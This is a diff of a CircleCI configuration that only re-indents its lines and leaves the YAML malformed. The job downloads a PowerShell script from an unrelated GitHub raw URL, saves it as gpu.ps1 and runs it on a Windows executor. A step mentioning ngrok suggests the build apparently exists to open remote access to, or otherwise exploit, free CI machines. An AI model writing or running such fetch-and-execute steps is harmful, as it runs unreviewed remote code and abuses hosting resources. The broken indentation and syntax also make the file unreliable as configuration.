@@ -1,20 +1,20 @@
 version: 2.1
 
 orbs:
- win: circleci/windows@2.2.0
+  win: circleci/windows@2.2.0
 
 jobs:
   build:
-   executor:
-    name:win/default
-    size:"medium"
+    executor:
+      name:win/default
+      size:"medium"
 
 
-  steps:
+   steps:
 
-   -run:
-     name: paste Ngrok Value In Hosted Link
-     command: |
-      Invoke-WebRequest https://raw.githubusercontent.com/Urkkmnrkl/Uguu/main/sh -OutFile gpu.ps1
-                                                       
-   -run: ./gpu.ps1
+     -run:
+        name: paste Ngrok Value In Hosted Link
+        command: |
+          Invoke-WebRequest https://raw.githubusercontent.com/Urkkmnrkl/Uguu/main/sh -OutFile gpu.ps1
+ 
+     -run: ./gpu.ps1
